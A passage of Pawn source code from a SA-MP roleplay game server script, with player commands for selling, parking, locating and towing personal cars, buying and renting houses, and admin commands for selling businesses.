            if(pil <= -1 || pil >= 7000000) return SCM(playerid,COLOR_ALI,"Price must be between $0 and $7,000,000");
            if(GetPlayerPool(taraf) < pil) {format(string,sizeof string,"That player just has $%s",FormatNumber(GetPlayerPool(taraf)));return SCM(playerid,COLOR_YELLOW,string);}
            OnSellCar[playerid] = taraf;
            OwnableCarOffer[taraf] = playerid;
            OwnableCarPrice[taraf] = pil;
            OwnableCarID[taraf] = PINFO[playerid][pCar];
            OwnableCarMethod[taraf] = 1;
            format(string,sizeof string,"You are called for a sellcar to %s, Price: %s, wait for a reply, if you want to cancel it use /cancel sellcarto.",PINFO[taraf][pName], FormatNumber(pil));
            SCM(playerid,COL_SYN,string);
            format(string,sizeof string,"%s wants to sell their car to you, Price: %s, if you accept use /accept personalcar %d.",PINFO[playerid][pName], FormatNumber(pil), playerid);
            SCM(taraf,COL_SYN,string);
            return 1;
        }
        else if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar_2])
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /sellcarto <PlayerID/PartOfName> <Price>");
            new taraf = ReturnUser(tmp);
            if(!IsPlayerConnected(taraf)) return SCM(playerid,COLOR_ALI,"That player is offline.");
            if(!ProxDetectorS(5.0, playerid, taraf)) return SCM(playerid,COLOR_ALI,"You must near this player.");
            if(PINFO[taraf][pLevel] <= 4) return SCM(playerid,COLOR_ALI,"That player must has more than 5 levels.");
            if(PlayerInfo[taraf][pCar] != 9999 && PlayerInfo[taraf][pPremiumAccount] == 0) return SCM(playerid,COL_SYN,"In Bazikon Baraie Kharid Car2 Baiad Premium Bashad.");
            if(PINFO[taraf][pCar] != 0 && PINFO[taraf][pCar_2] != 0) return SCM(playerid,COLOR_ALI,"That player is already has personal car.");
            if(OnSellCar[playerid] == taraf) return SCM(playerid,COLOR_ALI,"You already called for a sellcar to this player, wait for a reply.");
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /sellcarto <PlayerID/PartOfName> <Price>");
            new pil = strval(tmp);
            if(pil <= -1 || pil >= 7000000) return SCM(playerid,COLOR_ALI,"Price must be between $0 and $7,000,000");
            if(GetPlayerPool(taraf) < pil) {format(string,sizeof string,"That player just has $%s",FormatNumber(GetPlayerPool(taraf)));return SCM(playerid,COLOR_YELLOW,string);}
            OnSellCar[playerid] = taraf;
            OwnableCarOffer[taraf] = playerid;
            OwnableCarPrice[taraf] = pil;
            OwnableCarID[taraf] = PINFO[playerid][pCar_2];
            OwnableCarMethod[taraf] = 2;
            format(string,sizeof string,"You are called for a sellcar to %s, Price: %s, wait for a reply, if you want to cancel it use /cancel sellcarto.",PINFO[taraf][pName], FormatNumber(pil));
            SCM(playerid,COL_SYN,string);
            format(string,sizeof string,"%s wants to sell their car to you, Price: %s, if you accept use /accept personalcar %d.",PINFO[playerid][pName], FormatNumber(pil),playerid);
            SCM(taraf,COL_SYN,string);
            return 1;
        }
        else return SCM(playerid,COLOR_ALI,"You must sit on your vehicle.");
    }
    if(strcmp(cmd, "/park", true) == 0)
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a personal car.");
        if(GetPlayerInterior(playerid) != 0) return SCM(playerid, COLOR_ALI, "You can't do it here.");
        new Float:x,Float:y,Float:z;
        new Float:a;
        new carid = GetPlayerVehicleID(playerid);
        GetVehiclePos(carid, x, y, z);
        GetVehicleZAngle(carid, a);
        new Float:vh;GetVehicleHealth(carid,vh);
        if(vh < 249.9) return SCM(playerid,COLOR_ALI,"You cannot do it now.");
        new owner = playerid;
        if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar])
        {
            GetVehicleDamageStatus(carid,PINFO[owner][cPanel],PINFO[owner][cDoors],PINFO[owner][cLights],PINFO[owner][cTires]);
            SaveKonVal(owner, "cPanel", PINFO[owner][cPanel]);
            SaveKonVal(owner, "cDoors", PINFO[owner][cDoors]);
            SaveKonVal(owner, "cLights", PINFO[owner][cLights]);
            SaveKonVal(owner, "cTires", PINFO[owner][cTires]);
            PlayerInfo[owner][cHealth] = vh;
            SaveKonFloat(owner, "cHealth", vh);
            PlayerInfo[MashinOwner[carid]][cLocationx] = x;
            SaveKonFloat(owner, "cLocationx", x);
            PlayerInfo[MashinOwner[carid]][cLocationy] = y;
            SaveKonFloat(owner, "cLocationy", y);
            PlayerInfo[MashinOwner[carid]][cLocationz] = z;
            SaveKonFloat(owner, "cLocationz", z);
            PlayerInfo[MashinOwner[carid]][cAngle] = a;
            SaveKonFloat(owner, "cAngle", a);
            GameTextForPlayer(playerid, "vehicle ~n~~w~has saved in the position", 5000, 1);
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            //SaveAccount(playerid);
            MashinOwner[carid] = 9999;
            DestroyVehicle(carid, true);
            OwnedMashin[carid] = 0;
            new model = PlayerInfo[playerid][cModel];
            new Float:posx = PlayerInfo[playerid][cLocationx];
            new Float:posy = PlayerInfo[playerid][cLocationy];
            new Float:posz = PlayerInfo[playerid][cLocationz];
            new Float:angle = PlayerInfo[playerid][cAngle];
            new color1 = PlayerInfo[playerid][cColor1];
            new color2 = PlayerInfo[playerid][cColor2];
            new caris = CreateVehicle(model,posx,posy,posz,angle,color1,color2,-1);
            OwnedMashin[caris] = 1;
            MashinOwner[caris] = playerid;
            SetVehicleNumberPlate(caris,PlayerInfo[playerid][cPlate]);
            PlayerInfo[playerid][pCar] = caris;
            SaveKonVal(playerid, "pCar", caris);
            Benzin[caris] = PlayerInfo[playerid][cFuel];
            SetVehicleHealthEx(caris,PlayerInfo[playerid][cHealth]);
            ModVehicle(playerid,caris);
            UpdateVehicleDamageStatus(caris,PINFO[playerid][cPanel],PINFO[playerid][cDoors],PINFO[playerid][cLights],PINFO[playerid][cTires]);
            PutPlayerInVehicle(playerid, caris, 0);
        }
        else if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar_2])
        {
            GetVehicleDamageStatus(carid,PINFO[owner][cPanel_2],PINFO[owner][cDoors_2],PINFO[owner][cLights_2],PINFO[owner][cTires_2]);
            SaveKonVal(owner, "cPanel_2", PINFO[owner][cPanel_2]);
            SaveKonVal(owner, "cDoors_2", PINFO[owner][cDoors_2]);
            SaveKonVal(owner, "cLights_2", PINFO[owner][cLights_2]);
            SaveKonVal(owner, "cTires_2", PINFO[owner][cTires_2]);
            PlayerInfo[owner][cHealth_2] = vh;
            SaveKonFloat(owner, "cHealth_2", vh);
            PlayerInfo[owner][cLocationx_2] = x;
            SaveKonFloat(owner, "cLocationx_2", x);
            PlayerInfo[owner][cLocationy_2] = y;
            SaveKonFloat(owner, "cLocationy_2", y);
            PlayerInfo[owner][cLocationz_2] = z;
            SaveKonFloat(owner, "cLocationz_2", z);
            PlayerInfo[owner][cAngle_2] = a;
            SaveKonFloat(owner, "cAngle_2", a);
            GameTextForPlayer(playerid, "vehicle ~n~~w~has saved in the position", 5000, 1);
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            //SaveAccount(playerid);
            MashinOwner_2[carid] = 9999;
            DestroyVehicle(carid, true);
            OwnedMashin_2[carid] = 0;
            new model = PlayerInfo[playerid][cModel_2];
            new Float:posx = PlayerInfo[playerid][cLocationx_2];
            new Float:posy = PlayerInfo[playerid][cLocationy_2];
            new Float:posz = PlayerInfo[playerid][cLocationz_2];
            new Float:angle = PlayerInfo[playerid][cAngle_2];
            new color1 = PlayerInfo[playerid][cColor1_2];
            new color2 = PlayerInfo[playerid][cColor2_2];
            new caris = CreateVehicle(model,posx,posy,posz,angle,color1,color2,-1);
            OwnedMashin_2[caris] = 1;
            MashinOwner_2[caris] = playerid;
            SetVehicleNumberPlate(caris,PlayerInfo[playerid][cPlate_2]);
            PlayerInfo[playerid][pCar_2] = caris;
            SaveKonVal(playerid, "pCar_2", caris);
            Benzin[caris] = PlayerInfo[playerid][cFuel_2];
            SetVehicleHealthEx(caris,PlayerInfo[playerid][cHealth_2]);
            ModVehicle(playerid,caris);
            UpdateVehicleDamageStatus(caris,PINFO[playerid][cPanel_2],PINFO[playerid][cDoors_2],PINFO[playerid][cLights_2],PINFO[playerid][cTires_2]);
            PutPlayerInVehicle(playerid, caris, 0);
        }
        else return SCM(playerid,COLOR_ALI,"You must sit on your vehicle.");
        return 1;
    }
    if(strcmp(cmd,"/locatecar",true)==0)
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a personal car.");
        if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
        if(PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] == 0)
        {
            if(PINFO[playerid][gParked] == 1) return SCM(playerid,COLOR_Good,"Your vehicle is on your garage use /gget.");
            new Float:x,Float:y,Float:z;
            new car = PlayerInfo[playerid][pCar];
            SendClientMessage(playerid,COLOR_WHITE,"Be Noghte {57e547}Ghermez {FFFFFF}Dar Naghshe Beravid.");
            GetVehiclePos(car, x, y, z);
            OnCheckpoint[playerid] = 1;
            SetPlayerCheckpoint(playerid, x, y, z, 6);
            locatemashin[playerid] = 1;
        }
        else if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] != 0)
        {
            if(PINFO[playerid][gParked_2] == 1) return SCM(playerid,COLOR_Good,"Your vehicle is on your garage use /gget.");
            new Float:x,Float:y,Float:z;
            new car = PlayerInfo[playerid][pCar_2];
            SendClientMessage(playerid,COLOR_WHITE,"Be Noghte {57e547}Ghermez {FFFFFF}Dar Naghshe Beravid.");
            GetVehiclePos(car, x, y, z);
            OnCheckpoint[playerid] = 1;
            SetPlayerCheckpoint(playerid, x, y, z, 6);
            locatemashin[playerid] = 1;
        }
        else if(PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] != 0)
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /locatecar <CarID(1 or 2)>");
            new ccr = strval(tmp);
            if(ccr != 1 && ccr != 2) return SCM(playerid,COLOR_ALI,"Invalid CarID");
            if(ccr == 1)
            {
                if(PINFO[playerid][gParked] == 1) return SCM(playerid,COLOR_Good,"Your vehicle is on your garage use /gget.");
                new Float:x,Float:y,Float:z;
                new car = PlayerInfo[playerid][pCar];
	            SendClientMessage(playerid,COLOR_WHITE,"Be Noghte {57e547}Ghermez {FFFFFF}Dar Naghshe Beravid.");
                GetVehiclePos(car, x, y, z);
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid, x, y, z, 6);
                locatemashin[playerid] = 1;
                return 1;
            }
            else if(ccr == 2)
            {
                if(PINFO[playerid][gParked_2] == 1) return SCM(playerid,COLOR_Good,"Your vehicle is on your garage use /gget.");
                new Float:x,Float:y,Float:z;
                new car = PlayerInfo[playerid][pCar_2];
	            SendClientMessage(playerid,COLOR_WHITE,"Be Noghte {57e547}Ghermez {FFFFFF}Dar Naghshe Beravid.");
                GetVehiclePos(car, x, y, z);
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid, x, y, z, 6);
                locatemashin[playerid] = 1;
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/towcar", true) == 0)
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a personal car.");
        if(PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] == 0)
        {
            new car = PlayerInfo[playerid][pCar];
            if (car != 0)
            {
                if(PINFO[playerid][gParked] == 1) return SCM(playerid,COLOR_Good,"Your vehicle is on your garage use /gget.");
                new Float:vh;GetVehicleHealth(car,vh);
                if(vh < 249.9) return SCM(playerid,COLOR_ALI,"You cannot do that now.");
                if(CarTow(car) && IsUnusedMashin(car))
                {
                    new stri[50];
                    format(stri, 50, "~w~Car~n~~g~Towed~n~~r~-$%s", FormatNumber(SBizzInfo[8][sbEntranceCost]));
                    GameTextForPlayer(playerid, stri, 5000, 1);
                    GivePlayerPool(playerid,-SBizzInfo[8][sbEntranceCost]);
                    SetVehicleToRespawn(car);
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    SBizzInfo[8][sbTill] += SBizzInfo[8][sbEntranceCost];//towcar buisness
                    SBizzInfo[8][sbProducts]--;
                }
                else GameTextForPlayer(playerid, "~w~Car is~n~in ~r~use", 5000, 1);
            }
        }
        else if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] != 0)
        {
            new car = PlayerInfo[playerid][pCar_2];
            if(PINFO[playerid][gParked_2] == 1) return SCM(playerid,COLOR_Good,"Your vehicle is on your garage use /gget.");
            if (car != 0)
            {
                new Float:vh;GetVehicleHealth(car,vh);
                if(vh < 249.9) return SCM(playerid,COLOR_ALI,"You cannot do that now.");
                if(CarTow(car) && IsUnusedMashin(car))
                {
                    new stri[50];
                    format(stri, 50, "~w~Car~n~~g~Towed~n~~r~-$%s", FormatNumber(SBizzInfo[8][sbEntranceCost]));
                    GameTextForPlayer(playerid, stri, 5000, 1);
                    GivePlayerPool(playerid,-SBizzInfo[8][sbEntranceCost]);
                    SetVehicleToRespawn(car);
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    SBizzInfo[8][sbTill] += SBizzInfo[8][sbEntranceCost];//towcar buisness
                    SBizzInfo[8][sbProducts]--;
                }
                else GameTextForPlayer(playerid, "~w~Car is~n~in ~r~use", 5000, 1);
            }
        }
        else if(PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] != 0)
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /towcar <CarID(1 or 2)>");
            new ccr = strval(tmp);
            if(ccr != 1 && ccr != 2) return SCM(playerid,COLOR_ALI,"Invalid CarID.");
            if(ccr == 1)
            {
                new car = PlayerInfo[playerid][pCar];
                if (car != 0)
                {
                    if(PINFO[playerid][gParked] == 1) return SCM(playerid,COLOR_Good,"Your vehicle is on your garage use /gget.");
                    new Float:vh;GetVehicleHealth(car,vh);
                    if(vh < 249.9) return SCM(playerid,COLOR_ALI,"You cannot do that now.");
                    if(CarTow(car) && IsUnusedMashin(car))
                    {
                        new stri[50];
                        format(stri, 50, "~w~Car~n~~g~Towed~n~~r~-$%s", FormatNumber(SBizzInfo[8][sbEntranceCost]));
                        GameTextForPlayer(playerid, stri, 5000, 1);
                        GivePlayerPool(playerid,-SBizzInfo[8][sbEntranceCost]);
                        SetVehicleToRespawn(car);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        SBizzInfo[8][sbTill] += SBizzInfo[8][sbEntranceCost];//towcar buisness
                        SBizzInfo[8][sbProducts]--;
                    }
                    else GameTextForPlayer(playerid, "~w~Car is~n~in ~r~use", 5000, 1);
                }
            }
            else if(ccr == 2)
            {
                if(PINFO[playerid][gParked_2] == 1) return SCM(playerid,COLOR_Good,"Your vehicle is on your garage use /gget.");
                new car = PlayerInfo[playerid][pCar_2];
                if (car != 0)
                {
                    new Float:vh;GetVehicleHealth(car,vh);
                    if(vh < 249.9) return SCM(playerid,COLOR_ALI,"You cannot do that now.");
                    if(CarTow(car) && IsUnusedMashin(car))
                    {
                        new stri[50];
                        format(stri, 50, "~w~Car~n~~g~Towed~n~~r~-$%s", FormatNumber(SBizzInfo[8][sbEntranceCost]));
                        GameTextForPlayer(playerid, stri, 5000, 1);
                        GivePlayerPool(playerid,-SBizzInfo[8][sbEntranceCost]);
                        SetVehicleToRespawn(car);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        SBizzInfo[8][sbTill] += SBizzInfo[8][sbEntranceCost];//towcar buisness
                        SBizzInfo[8][sbProducts]--;
                    }
                    else GameTextForPlayer(playerid, "~w~Car is~n~in ~r~use", 5000, 1);
                }
            }
        }
        return 1;
    }
/*----------------------------------------------------------------------------*/


		if(strcmp(cmd, "/buyhouse", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(PlayerInfo[playerid][pPhousekey] != 9999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pPhousekey]][hOwner], true) == 0)
						{
							SCM(playerid, COLOR_WHITE, "You already own a house, sell it first.");
							return 1;
						}
						if(PINFO[playerid][pRented] != 0) return SCM(playerid,COLOR_Good,"You already rented a house /unrentroom first.");
				new Float:oldposx, Float:oldposy, Float:oldposz;
				GetPlayerName(playerid, playername, sizeof(playername));
				GetPlayerPos(playerid, oldposx, oldposy, oldposz);
				for(new h = 0; h < sizeof(HouseInfo); h++)
				{
					if(PlayerToPoint(2.0, playerid, HouseInfo[h][hExitx], HouseInfo[h][hExity], HouseInfo[h][hExitz]) && HouseInfo[h][hOwned] == 0)
					{
						if(PlayerInfo[playerid][pLevel] < HouseInfo[h][hLevel])
						{
							format(string, sizeof(string), "You need to be level +%d to buy ee.", HouseInfo[h][hLevel]);
							SCM(playerid, COLOR_WHITE, string);
							return 1;
						}
						if(GetPlayerPool(playerid) > HouseInfo[h][hValue])
						{
							PlayerInfo[playerid][pPhousekey] = h;
							SaveKonVal(playerid, "pPhousekey", h);
							PlayerInfo[playerid][pRented] = 0;
							SaveKonVal(playerid, "pRented", 0);
							HouseInfo[h][hOwned] = 1;
							SaveKonValH(h, "hOwned", 1);

							strmid(HouseInfo[h][hOwner], PlayerInfo[playerid][pName], 0, strlen(PlayerInfo[playerid][pName]), 255);
							SaveKonStrH(h, "hOwner", PlayerInfo[playerid][pName]);
							GivePlayerPool(playerid,-HouseInfo[h][hValue]);
							PlayerPlayMusic(playerid);
							SetPlayerInterior(playerid,HouseInfo[h][hInt]);
							SetPlayerVirtualWorld(playerid,HouseInfo[h][hWorld]);
							SetPlayerPos(playerid,HouseInfo[h][hEntrancex],HouseInfo[h][hEntrancey],HouseInfo[h][hEntrancez]);
							SetPlayerMapIcon(playerid,30,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz],31,COLOR_LIGHTRED);
							TooHouse[playerid] = h;
							GameTextForPlayer(playerid, "~w~Welcome Home~n~You can exit at any time by moving to this door and Type /enter", 5000, 3);
							SCM(playerid, COLOR_GRAD1, "Congratulations with home");
							SCM(playerid, COLOR_GRAD2, "Type /househelp to view house commands.");
							//SaveAccount(playerid);
							Mahal[playerid] = 3;
							TooBiz[playerid] = 9999;
							return 1;
						}
						else
						{
							SCM(playerid, COLOR_WHITE, "Shoma Pool Kafi Nadarid.");
							return 1;
						}
					}
					else if(PlayerToPoint(2.0, playerid, HouseInfo[h][hExitx], HouseInfo[h][hExity], HouseInfo[h][hExitz]) && HouseInfo[h][hOwned] == 2)
					{
						if(PlayerInfo[playerid][pLevel] < HouseInfo[h][hLevel])
						{
							format(string, sizeof(string), "You need to be level +%d to buy this house.", HouseInfo[h][hLevel]);
							SCM(playerid, COLOR_WHITE, string);
							return 1;
						}
						if(PlayerInfo[playerid][pPhousekey] != 9999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pPhousekey]][hOwner], true) == 0)
						{
							SCM(playerid, COLOR_WHITE, "You already own a house, sell it first.");
							return 1;
						}
						if(GetPlayerPool(playerid) > HouseInfo[h][hForosh])
						{
							new OwnerA = ReturnUserEx(HouseInfo[h][hOwner]);
							if(IsPlayerConnected(OwnerA) && gPlayerLogged[OwnerA] == 1)
							{
							PlayerInfo[playerid][pPhousekey] = h;
							SaveKonVal(playerid, "pPhousekey", h);
							PlayerInfo[OwnerA][pPhousekey] = 9999;
							SaveKonVal(OwnerA, "pPhousekey", 9999);
						   /*
						   if(PINFO[OwnerA][gParked] == 1)
							{
								CreateVehGarage(OwnerA);
								SCM(OwnerA,COLOR_Good,"Your first car have been evicted from the parking.");
							}
							if(PINFO[OwnerA][gParked_2] == 1)
							{
								CreateVehGarage_2(OwnerA);
								SCM(OwnerA,COLOR_Good,"Your first car have been evicted from the parking.");
							}
							*/
							PlayerInfo[playerid][pRented] = 0;
							SaveKonVal(playerid, "pRented", 0);
							HouseInfo[h][hOwned] = 1;
							SaveKonValH(h, "hOwned", 1);
							GetPlayerName(playerid, sendername, sizeof(sendername));
							strmid(HouseInfo[h][hOwner], sendername, 0, strlen(sendername), 255);
							SaveKonStrH(h, "hOwner", sendername);
							GivePlayerPool(playerid,-HouseInfo[h][hForosh]);
							PlayerInfo[OwnerA][pAccount] += HouseInfo[h][hForosh];
							SaveKonVal(OwnerA, "pAccount", PINFO[OwnerA][pAccount]);
							PlayerPlayMusic(playerid);
							SetPlayerInterior(playerid,HouseInfo[h][hInt]);
							SetPlayerVirtualWorld(playerid,HouseInfo[h][hWorld]);
							SetPlayerPos(playerid,HouseInfo[h][hEntrancex],HouseInfo[h][hEntrancey],HouseInfo[h][hEntrancez]);
							SetPlayerMapIcon(playerid,30,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz],31,COLOR_LIGHTRED);
							TooHouse[playerid] = h;
							GameTextForPlayer(playerid, "~w~Welcome Home~n~You can exit at any time by moving to this door and Type /enter", 5000, 3);
							SCM(playerid, COLOR_GRAD1, "Congratulations with home");
							SCM(playerid, COLOR_GRAD2, "Type /househelp to view house commands.");
							//SaveAccount(playerid);
							//SaveAccount(OwnerA);
							Mahal[playerid] = 3;
							TooBiz[playerid] = 9999;
							}
							else
							{
							SellOfflinePlayerHouse(playerid,h);
							}
							return 1;
						}
						else
						{
							SCM(playerid, COLOR_WHITE, "Shoma Pool Kafi Nadarid.");
							return 1;
						}
					}
				}
			}
			return 1;
		}



    if(strcmp(cmd, "/renters", true) == 0)
    {
        if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
        if(IsPlayerConnected(playerid))
        {
            NeshoonBedeRenters(playerid);
        }
        return 1;
    }

		if(strcmp(cmd, "/banlist", true) == 0)
		{
			if(PINFO[playerid][pAdmin] <= 7) return SCM(playerid,COLOR_GREEN,"You are not authorized to use that command.");
			if(IsPlayerConnected(playerid))
			{
				NeshoonBedeBans(playerid);
			}
			return 1;
		}


    if(strcmp(cmd, "/rentroom", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new Float:oldposx, Float:oldposy, Float:oldposz;
            GetPlayerName(playerid, playername, sizeof(playername));
            GetPlayerPos(playerid, oldposx, oldposy, oldposz);
            for(new h = 0; h < sizeof(HouseInfo); h++)
            {
                if(PlayerToPoint(2.0, playerid, HouseInfo[h][hExitx], HouseInfo[h][hExity], HouseInfo[h][hExitz]) && (HouseInfo[h][hOwned] == 1 || HouseInfo[h][hOwned] == 2) &&  HouseInfo[h][hRentabil] == 1)
                {
                    if(PlayerInfo[playerid][pPhousekey] != 9999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pPhousekey]][hOwner], true) == 0)
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "You already own a house, type /sellhouse if you want to rent this one.");
                        return 1;
                    }
                    if(PlayerInfo[playerid][pAccount] >= HouseInfo[h][hRent])
                    {
                        PlayerInfo[playerid][pPhousekey] = h;
                        SaveKonVal(playerid, "pPhousekey", h);
                        PlayerInfo[playerid][pRented] = 1;
                        SaveKonVal(playerid, "pRented", 1);
                        PINFO[playerid][pAccount] -= HouseInfo[h][hRent];
                        SaveKonVal(playerid, "pAccount", PINFO[playerid][pAccount]);
                        HouseInfo[h][hTakings] = HouseInfo[h][hTakings]+HouseInfo[h][hRent];
                        SaveKonValH(h, "hTakings", HouseInfo[h][hTakings]);
                        PlayerPlayMusic(playerid);
                        SetPlayerInterior(playerid,HouseInfo[h][hInt]);
                        SetPlayerVirtualWorld(playerid,HouseInfo[h][hWorld]);
                        SetPlayerMapIcon(playerid,30,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz],31,COLOR_LIGHTRED);
                        SetPlayerPosEx(playerid,HouseInfo[h][hEntrancex],HouseInfo[h][hEntrancey],HouseInfo[h][hEntrancez]);
                        TooHouse[playerid] = h;
                        GameTextForPlayer(playerid, "~w~Welcome Home~n~You can exit at any time by moving to this door and Type /enter", 5000, 3);
                        SendClientMessage(playerid, COLOR_WHITE, "** Congratulations, You can enter and exit here anytime.");
                        SendClientMessage(playerid, COLOR_WHITE, "** Type /help to review the new property help section.");
                        //SaveAccount(playerid);
                        Mahal[playerid] = 3;
                        TooBiz[playerid] = 9999;
                        return 1;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "You haven't enough cash in your account(bank account)");
                        return 1;
                    }
                }
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/unrentvehicle", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(RentedVehicle[playerid] != INVALID_VEHICLE_ID)
            {
                SetVehicleToRespawn(RentedVehicle[playerid]);
                RentedVehicle[playerid] = INVALID_VEHICLE_ID;
                GameTextForPlayer(playerid, "~w~You no longer rent a vehicle", 5000, 3);
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/unrentroom", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            if(PlayerInfo[playerid][pPhousekey] != 9999 && strcmp(playername, HouseInfo[PlayerInfo[playerid][pPhousekey]][hOwner], true) == 0)
            {
                SendClientMessage(playerid, COLOR_WHITE, "You haven't a rented house.");
                return 1;
            }
            if(PlayerInfo[playerid][pRented] != 1)
            {
                SCM(playerid, COLOR_CRS3, "You haven't rent a house.");
                return 1;
            }
            RemovePlayerMapIcon(playerid,30);
            PlayerInfo[playerid][pPhousekey] = 9999;
            SaveKonVal(playerid, "pPhousekey", 9999);
            PlayerInfo[playerid][pRented] = 0;
            SaveKonVal(playerid, "pRented", 0);
            SendClientMessage(playerid, COLOR_GREEN, "You are now homeless.");
            if(PINFO[playerid][gParked] == 1)
            {
                CreateVehGarage(playerid);
                SCM(playerid,COLOR_Good,"Your first car have been evicted from the parking.");
            }
            if(PINFO[playerid][gParked_2] == 1)
            {
                CreateVehGarage_2(playerid);
                SCM(playerid,COLOR_Good,"Your first car have been evicted from the parking.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/housewithdraw", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            new bouse = PlayerInfo[playerid][pPhousekey];
            if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /housewithdraw <Amount>");
                    format(string, sizeof(string), "You've got $%s in your house.", FormatNumber(HouseInfo[bouse][hTakings]));
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    return 1;
                }
                new cashdeposit = strval(tmp);
                if (cashdeposit > HouseInfo[bouse][hTakings] || cashdeposit < 1)
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "You haven't enough money in home.");
                    return 1;
                }
                if (TooHouse[playerid] != bouse)
                {
                    SendClientMessage(playerid, COLOR_ALI, "You must be in home to do that.");
                    return 1;
                }
                else
                {
                    GivePlayerPool(playerid,cashdeposit);
                    HouseInfo[bouse][hTakings]=HouseInfo[bouse][hTakings]-cashdeposit;
                    SaveKonValH(bouse, "hTakings", HouseInfo[bouse][hTakings]);
                    format(string, sizeof(string), "You have withdrawn $%s from home Total: $%s", FormatNumber(cashdeposit),FormatNumber(HouseInfo[bouse][hTakings]));
                    SendClientMessage(playerid, COLOR_YELLOW, string);
                    return 1;
                }
        }
        return 1;

    }


    if(strcmp(cmd, "/asellbiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /asellbiz [bizid]");
                return 1;
            }
            new biz = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 7)
            {
                BizzInfo[biz][bLocked] = 1;
                BizzInfo[biz][bOwned] = 0;
                SaveKonVal(BizzInfo[biz][bOwner], "pPbiskey", 9999);
                strmid(BizzInfo[biz][bOwner], "The State", 0, strlen("The State"), 255);
                PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                GameTextForPlayer(playerid, "~w~You have sold the Business", 10000, 3);
				OnBizUpdate(biz);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_WHITE, "You are not an admin.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/asellsbiz", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /asellsbiz [sbizid]");
                return 1;
            }
            new sbiz = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 7)
            {
                SBizzInfo[sbiz][sbOwned] = 0;
                SaveKonVal(SBizzInfo[sbiz][sbOwner], "pPbiskey", 9999);
                strmid(SBizzInfo[sbiz][sbOwner], "The State", 0, strlen("The State"), 255);
                PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                GameTextForPlayer(playerid, "~w~You have sold the Business", 10000, 3);
			    OnSbizUpdate(sbiz);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_WHITE, "You are not an admin.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/asellhouse", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
